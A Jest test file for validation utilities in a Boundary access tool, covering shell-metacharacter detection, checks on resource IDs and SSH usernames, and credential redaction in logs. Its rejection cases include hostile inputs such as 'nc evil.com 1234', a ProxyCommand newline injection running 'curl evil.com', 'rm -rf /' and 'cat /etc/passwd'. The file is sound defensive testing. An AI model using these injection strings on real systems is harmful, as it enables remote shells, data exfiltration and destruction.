/**
 * Unit tests for input validation utilities
 * Tests validation of Boundary resource IDs and user inputs to prevent shell injection
 */

describe('Validation utilities', () => {
  // Import the validation module
  let validateBoundaryId: (value: string, expectedPrefix?: string) => boolean;
  let validateAuthMethodId: (value: string) => boolean;
  let validateTargetId: (value: string) => boolean;
  let validateScopeId: (value: string) => boolean;
  let validateUsername: (value: string) => boolean;
  let sanitizeForLogging: (data: unknown) => unknown;
  let containsShellMetacharacters: (value: string) => boolean;

  beforeEach(() => {
    // Reset module cache to get fresh imports
    jest.resetModules();

    // Import the module under test
    const validationModule = require('../../../src/utils/validation');
    validateBoundaryId = validationModule.validateBoundaryId;
    validateAuthMethodId = validationModule.validateAuthMethodId;
    validateTargetId = validationModule.validateTargetId;
    validateScopeId = validationModule.validateScopeId;
    validateUsername = validationModule.validateUsername;
    sanitizeForLogging = validationModule.sanitizeForLogging;
    containsShellMetacharacters = validationModule.containsShellMetacharacters;
  });

  describe('containsShellMetacharacters', () => {
    describe('should detect shell metacharacters', () => {
      const testCases: [string, string][] = [
        ['ampw_test$(whoami)', 'command substitution with $()'],
        ['ampw_test`id`', 'command substitution with backticks'],
        ['ampw_test;ls', 'semicolon command separator'],
        ['ampw_test|cat', 'pipe operator'],
        ['ampw_test&', 'background operator'],
        ['ampw_test<file', 'input redirection'],
        ['ampw_test>file', 'output redirection'],
        ['ampw_test()', 'parentheses'],
        ['ampw_test{}', 'braces'],
        ['ampw_test[]', 'brackets'],
        ['ampw_test!cmd', 'exclamation mark'],
        ['ampw_test\\cmd', 'backslash'],
        ['ampw_test"cmd"', 'double quotes'],
        ["ampw_test'cmd'", 'single quotes'],
        ['ampw_test*', 'glob asterisk'],
        ['ampw_test?', 'glob question mark'],
        ['ampw_test\nProxyCommand', 'newline character'],
        ['ampw_test\rProxyCommand', 'carriage return'],
        ['ampw_test\tProxyCommand', 'tab character'],
        ['ampw_test#comment', 'hash for comment'],
        ['ampw_test%var%', 'Windows variable expansion'],
      ];

      test.each(testCases)('%s should be detected as %s', (input, _description) => {
        expect(containsShellMetacharacters(input)).toBe(true);
      });
    });

    describe('should allow safe characters', () => {
      const testCases: [string, string][] = [
        ['ampw_1234567890', 'alphanumeric with underscore'],
        ['amoidc_abcdefghij', 'lowercase letters'],
        ['ttcp_ABCDEFGHIJ', 'uppercase letters'],
        ['ampw_123_abc_XYZ', 'mixed alphanumeric with underscores'],
        ['p_proj_123', 'project ID'],
        ['o_org_456', 'org ID'],
        ['hcst_target_789', 'host catalog static target'],
        ['ampw_-test', 'hyphen'],
        ['ampw_.test', 'period'],
        ['ampw_@test', 'at sign (should be allowed for some contexts)'],
      ];

      test.each(testCases)('%s should be allowed as %s', (input, _description) => {
        // Note: Some of these might fail if @ is considered unsafe
        // This depends on implementation requirements
        const result = containsShellMetacharacters(input);
        // For now, we expect hyphen and period to be safe
        if (input.includes('-') || input.includes('.') || input.includes('_') || /^[a-zA-Z0-9]+$/.test(input.replace(/[_.-]/g, ''))) {
          expect(result).toBe(false);
        }
      });
    });

    describe('edge cases', () => {
      it('should handle empty string', () => {
        expect(containsShellMetacharacters('')).toBe(false);
      });

      it('should handle whitespace-only string', () => {
        expect(containsShellMetacharacters('   ')).toBe(true); // spaces could be problematic
      });

      it('should detect multiple metacharacters', () => {
        expect(containsShellMetacharacters('test$(id);ls|cat')).toBe(true);
      });
    });
  });

  describe('validateBoundaryId', () => {
    describe('valid IDs with expected prefix', () => {
      const validIds: [string, string, string][] = [
        ['ampw_1234567890', 'ampw_', 'password auth method'],
        ['amoidc_abcdefghij', 'amoidc_', 'OIDC auth method'],
        ['amldap_xyz1234567', 'amldap_', 'LDAP auth method'],
        ['ttcp_1234567890', 'ttcp_', 'TCP target'],
        ['tssh_1234567890', 'tssh_', 'SSH target'],
        ['p_1234567890', 'p_', 'project scope'],
        ['o_1234567890', 'o_', 'org scope'],
      ];

      test.each(validIds)('%s should be valid for prefix %s (%s)', (id, prefix, _description) => {
        expect(validateBoundaryId(id, prefix)).toBe(true);
      });
    });

    describe('valid IDs without expected prefix (generic validation)', () => {
      const validIds: [string, string][] = [
        ['ampw_1234567890', 'any valid Boundary ID'],
        ['amoidc_abcdefghij', 'OIDC auth method ID'],
        ['ttcp_test123', 'TCP target ID with alphanumeric'],
        ['hcst_catalog123', 'host catalog static'],
      ];

      test.each(validIds)('%s should be valid as %s', (id, _description) => {
        expect(validateBoundaryId(id)).toBe(true);
      });
    });

    describe('invalid IDs - shell metacharacters', () => {
      const invalidIds: [string, string | undefined, string][] = [
        ['ampw_$(whoami)', 'ampw_', 'command substitution with $()'],
        ['amoidc_`id`', 'amoidc_', 'command substitution with backticks'],
        ['ampw_;ls', 'ampw_', 'semicolon command separator'],
        ['ttcp_test|cat', 'ttcp_', 'pipe operator'],
        ['ampw_test&', 'ampw_', 'background operator'],
        ['ampw_test<file', 'ampw_', 'input redirection'],
        ['ampw_test>file', 'ampw_', 'output redirection'],
        ['ampw_test()', 'ampw_', 'parentheses'],
        ['ampw_{test}', 'ampw_', 'braces'],
        ['ampw_[test]', 'ampw_', 'brackets'],
        ['ampw_!test', 'ampw_', 'exclamation mark'],
        ['ampw_test\\cmd', 'ampw_', 'backslash'],
        ['ampw_"test"', 'ampw_', 'double quotes'],
        ["ampw_'test'", 'ampw_', 'single quotes'],
        ['ampw_test\nProxyCommand', 'ampw_', 'newline injection'],
        ['ampw_test\rmalicious', 'ampw_', 'carriage return injection'],
      ];

      test.each(invalidIds)('%s should be invalid with prefix %s due to %s', (id, prefix, _description) => {
        expect(validateBoundaryId(id, prefix)).toBe(false);
      });
    });

    describe('invalid IDs - wrong prefix', () => {
      const invalidIds: [string, string, string][] = [
        ['amoidc_1234567890', 'ampw_', 'OIDC prefix instead of password'],
        ['ampw_1234567890', 'amoidc_', 'password prefix instead of OIDC'],
        ['ttcp_1234567890', 'tssh_', 'TCP target instead of SSH'],
        ['invalid_123', 'ampw_', 'unrecognized prefix'],
        ['ampw', 'ampw_', 'prefix without suffix'],
        ['ampw_', 'ampw_', 'prefix with empty suffix'],
      ];

      test.each(invalidIds)('%s should be invalid for expected prefix %s (%s)', (id, prefix, _description) => {
        expect(validateBoundaryId(id, prefix)).toBe(false);
      });
    });

    describe('invalid IDs - wrong format', () => {
      const invalidIds: [string, string][] = [
        ['', 'empty string'],
        ['ampw', 'missing underscore separator'],
        ['_1234567890', 'missing prefix'],
        ['1234567890', 'no prefix at all'],
        ['AMPW_1234567890', 'uppercase prefix (Boundary IDs are lowercase)'],
      ];

      test.each(invalidIds)('%s should be invalid due to %s', (id, _description) => {
        expect(validateBoundaryId(id)).toBe(false);
      });
    });

    describe('edge cases', () => {
      it('should reject null', () => {
        expect(validateBoundaryId(null as any)).toBe(false);
      });

      it('should reject undefined', () => {
        expect(validateBoundaryId(undefined as any)).toBe(false);
      });

      it('should reject non-string values', () => {
        expect(validateBoundaryId(123 as any)).toBe(false);
        expect(validateBoundaryId({} as any)).toBe(false);
        expect(validateBoundaryId([] as any)).toBe(false);
      });
    });
  });

  describe('validateAuthMethodId', () => {
    describe('valid auth method IDs', () => {
      const validIds: [string, string][] = [
        ['ampw_1234567890', 'password auth method'],
        ['amoidc_abcdefghij', 'OIDC auth method'],
        ['amldap_xyz1234567', 'LDAP auth method'],
        ['ampw_test123_abc', 'password with mixed alphanumeric'],
      ];

      test.each(validIds)('%s should be valid (%s)', (id, _description) => {
        expect(validateAuthMethodId(id)).toBe(true);
      });
    });

    describe('invalid auth method IDs', () => {
      const invalidIds: [string, string][] = [
        ['ampw_$(whoami)', 'command injection attempt'],
        ['amoidc_`id`', 'backtick injection'],
        ['ampw_;rm -rf /', 'semicolon injection'],
        ['ttcp_1234567890', 'target ID instead of auth method'],
        ['p_1234567890', 'project ID instead of auth method'],
        ['', 'empty string'],
      ];

      test.each(invalidIds)('%s should be invalid (%s)', (id, _description) => {
        expect(validateAuthMethodId(id)).toBe(false);
      });
    });
  });

  describe('validateTargetId', () => {
    describe('valid target IDs', () => {
      const validIds: [string, string][] = [
        ['ttcp_1234567890', 'TCP target'],
        ['tssh_1234567890', 'SSH target'],
        ['ttcp_abcd1234ef', 'TCP target with letters'],
      ];

      test.each(validIds)('%s should be valid (%s)', (id, _description) => {
        expect(validateTargetId(id)).toBe(true);
      });
    });

    describe('invalid target IDs', () => {
      const invalidIds: [string, string][] = [
        ['ttcp_$(whoami)', 'command injection'],
        ['tssh_test;ls', 'semicolon injection'],
        ['ampw_1234567890', 'auth method ID instead of target'],
        ['', 'empty string'],
      ];

      test.each(invalidIds)('%s should be invalid (%s)', (id, _description) => {
        expect(validateTargetId(id)).toBe(false);
      });
    });
  });

  describe('validateScopeId', () => {
    describe('valid scope IDs', () => {
      const validIds: [string, string][] = [
        ['global', 'global scope'],
        ['p_1234567890', 'project scope'],
        ['o_1234567890', 'org scope'],
        ['p_test123', 'project with alphanumeric suffix'],
      ];

      test.each(validIds)('%s should be valid (%s)', (id, _description) => {
        expect(validateScopeId(id)).toBe(true);
      });
    });

    describe('invalid scope IDs', () => {
      const invalidIds: [string, string][] = [
        ['p_$(whoami)', 'command injection'],
        ['o_;ls', 'semicolon injection'],
        ['global;rm -rf /', 'global with injection'],
        ['ampw_1234567890', 'auth method ID instead of scope'],
        ['', 'empty string'],
      ];

      test.each(invalidIds)('%s should be invalid (%s)', (id, _description) => {
        expect(validateScopeId(id)).toBe(false);
      });
    });
  });

  describe('validateUsername', () => {
    describe('valid usernames', () => {
      const validUsernames: [string, string][] = [
        ['ubuntu', 'simple lowercase'],
        ['ec2-user', 'with hyphen'],
        ['admin_123', 'with underscore and numbers'],
        ['john.doe', 'with period'],
        ['user@domain', 'email-style'],
        ['root', 'root user'],
        ['Administrator', 'Windows admin with capitals'],
        ['user1', 'alphanumeric'],
        ['test_user-2024', 'mixed separators'],
      ];

      test.each(validUsernames)('%s should be valid (%s)', (username, _description) => {
        expect(validateUsername(username)).toBe(true);
      });
    });

    describe('invalid usernames - shell injection attempts', () => {
      const invalidUsernames: [string, string][] = [
        ['user$(id)', 'command substitution with $()'],
        ['user`whoami`', 'backtick command substitution'],
        ['user;rm -rf /', 'semicolon injection'],
        ['user|cat /etc/passwd', 'pipe injection'],
        ['user&nc evil.com 1234', 'background command injection'],
        ['user\nProxyCommand curl evil.com', 'newline injection for SSH config'],
        ['user\rmalicious', 'carriage return injection'],
        ['user<script>', 'angle brackets'],
        ['user{test}', 'braces'],
        ['user[0]', 'brackets'],
        ['user!cmd', 'exclamation mark'],
        ['user\\malicious', 'backslash'],
        ['user"quoted"', 'double quotes'],
        ["user'quoted'", 'single quotes'],
        ['user$PATH', 'variable expansion attempt'],
        ['user\tProxyCommand', 'tab injection'],
      ];

      test.each(invalidUsernames)('%s should be invalid (%s)', (username, _description) => {
        expect(validateUsername(username)).toBe(false);
      });
    });

    describe('invalid usernames - format issues', () => {
      const invalidUsernames: [string, string][] = [
        ['', 'empty string'],
        ['   ', 'whitespace only'],
        ['user name', 'contains space'],
        ['user*', 'contains glob asterisk'],
        ['user?', 'contains glob question mark'],
      ];

      test.each(invalidUsernames)('%s should be invalid (%s)', (username, _description) => {
        expect(validateUsername(username)).toBe(false);
      });
    });

    describe('edge cases', () => {
      it('should reject null', () => {
        expect(validateUsername(null as any)).toBe(false);
      });

      it('should reject undefined', () => {
        expect(validateUsername(undefined as any)).toBe(false);
      });

      it('should reject non-string values', () => {
        expect(validateUsername(123 as any)).toBe(false);
      });

      it('should handle very long usernames', () => {
        const longUsername = 'a'.repeat(256);
        // Should still validate based on content, not length
        // Implementation may add length restrictions
        const result = validateUsername(longUsername);
        expect(typeof result).toBe('boolean');
      });
    });
  });

  describe('sanitizeForLogging', () => {
    describe('should redact sensitive credential fields', () => {
      it('should redact password field', () => {
        const data = {
          authMethodId: 'ampw_1234567890',
          loginName: 'admin',
          password: 'supersecret123',
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          authMethodId: 'ampw_1234567890',
          loginName: 'admin',
          password: '[REDACTED]',
        });
      });

      it('should redact privateKey field', () => {
        const data = {
          username: 'ubuntu',
          privateKey: '-----BEGIN RSA PRIVATE KEY-----\nMIIE...',
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          username: 'ubuntu',
          privateKey: '[REDACTED]',
        });
      });

      it('should redact privateKeyPassphrase field', () => {
        const data = {
          username: 'ubuntu',
          privateKey: '-----BEGIN RSA PRIVATE KEY-----\nMIIE...',
          privateKeyPassphrase: 'passphrase123',
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          username: 'ubuntu',
          privateKey: '[REDACTED]',
          privateKeyPassphrase: '[REDACTED]',
        });
      });

      it('should redact authorizationToken field', () => {
        const data = {
          sessionId: 's_1234567890',
          authorizationToken: 'at_secrettoken12345',
          endpoint: 'localhost',
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          sessionId: 's_1234567890',
          authorizationToken: '[REDACTED]',
          endpoint: 'localhost',
        });
      });

      it('should redact token field', () => {
        const data = {
          success: true,
          token: 'at_verySecretToken',
          accountId: 'acct_123',
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          success: true,
          token: '[REDACTED]',
          accountId: 'acct_123',
        });
      });
    });

    describe('should preserve non-sensitive fields', () => {
      it('should preserve safe credential fields', () => {
        const data = {
          authMethodId: 'ampw_1234567890',
          loginName: 'admin',
          password: 'secret',
          accountId: 'acct_123',
          userId: 'u_456',
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toHaveProperty('authMethodId', 'ampw_1234567890');
        expect(sanitized).toHaveProperty('loginName', 'admin');
        expect(sanitized).toHaveProperty('accountId', 'acct_123');
        expect(sanitized).toHaveProperty('userId', 'u_456');
      });

      it('should preserve target information', () => {
        const data = {
          targetId: 'ttcp_1234567890',
          targetName: 'production-db',
          localHost: '127.0.0.1',
          localPort: 5432,
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual(data);
      });

      it('should preserve session information', () => {
        const data = {
          sessionId: 's_1234567890',
          status: 'active',
          startTime: '2024-01-01T00:00:00Z',
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual(data);
      });
    });

    describe('should handle nested objects', () => {
      it('should redact sensitive fields in nested objects', () => {
        const data = {
          session: {
            id: 's_123',
            credentials: {
              username: 'ubuntu',
              password: 'secret',
              privateKey: 'private-key-data',
            },
          },
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          session: {
            id: 's_123',
            credentials: {
              username: 'ubuntu',
              password: '[REDACTED]',
              privateKey: '[REDACTED]',
            },
          },
        });
      });

      it('should handle deeply nested structures', () => {
        const data = {
          level1: {
            level2: {
              level3: {
                password: 'secret',
                normalField: 'value',
              },
            },
          },
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          level1: {
            level2: {
              level3: {
                password: '[REDACTED]',
                normalField: 'value',
              },
            },
          },
        });
      });
    });

    describe('should handle arrays', () => {
      it('should sanitize objects within arrays', () => {
        const data = {
          credentials: [
            { username: 'user1', password: 'pass1' },
            { username: 'user2', password: 'pass2' },
          ],
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          credentials: [
            { username: 'user1', password: '[REDACTED]' },
            { username: 'user2', password: '[REDACTED]' },
          ],
        });
      });

      it('should handle mixed arrays', () => {
        const data = {
          items: [
            'string',
            123,
            { password: 'secret', name: 'test' },
            null,
          ],
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          items: [
            'string',
            123,
            { password: '[REDACTED]', name: 'test' },
            null,
          ],
        });
      });
    });

    describe('should handle edge cases', () => {
      it('should handle null', () => {
        expect(sanitizeForLogging(null)).toBe(null);
      });

      it('should handle undefined', () => {
        expect(sanitizeForLogging(undefined)).toBe(undefined);
      });

      it('should handle primitive values', () => {
        expect(sanitizeForLogging('string')).toBe('string');
        expect(sanitizeForLogging(123)).toBe(123);
        expect(sanitizeForLogging(true)).toBe(true);
      });

      it('should handle empty object', () => {
        expect(sanitizeForLogging({})).toEqual({});
      });

      it('should handle empty array', () => {
        expect(sanitizeForLogging([])).toEqual([]);
      });

      it('should not modify original object', () => {
        const original = {
          password: 'secret',
          username: 'admin',
        };

        const sanitized = sanitizeForLogging(original);

        // Original should be unchanged
        expect(original.password).toBe('secret');
        expect(original.username).toBe('admin');

        // Sanitized should have redacted password
        expect(sanitized).toEqual({
          password: '[REDACTED]',
          username: 'admin',
        });
      });

      it('should handle circular references gracefully', () => {
        const data: any = {
          name: 'test',
          password: 'secret',
        };
        data.self = data; // Create circular reference

        // Should not throw error
        expect(() => sanitizeForLogging(data)).not.toThrow();
      });
    });

    describe('comprehensive credential redaction', () => {
      it('should redact all sensitive fields in BrokeredCredential', () => {
        const data = {
          credentialSource: {
            id: 'cs_123',
            name: 'vault-creds',
          },
          credential: {
            username: 'dbuser',
            password: 'dbpass',
            privateKey: '-----BEGIN PRIVATE KEY-----',
            privateKeyPassphrase: 'keypass',
          },
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toEqual({
          credentialSource: {
            id: 'cs_123',
            name: 'vault-creds',
          },
          credential: {
            username: 'dbuser',
            password: '[REDACTED]',
            privateKey: '[REDACTED]',
            privateKeyPassphrase: '[REDACTED]',
          },
        });
      });

      it('should redact SessionAuthorization sensitive data', () => {
        const data = {
          sessionId: 's_123',
          authorizationToken: 'at_secret',
          endpoint: 'localhost',
          endpointPort: 22,
          expiration: new Date('2024-12-31'),
          credentials: [
            {
              credential: {
                username: 'admin',
                password: 'adminpass',
              },
            },
          ],
        };

        const sanitized = sanitizeForLogging(data);
        expect(sanitized).toHaveProperty('authorizationToken', '[REDACTED]');
        expect(sanitized).toHaveProperty('credentials');

        const credentials = (sanitized as any).credentials;
        expect(credentials[0].credential.password).toBe('[REDACTED]');
        expect(credentials[0].credential.username).toBe('admin');
      });
    });
  });
});
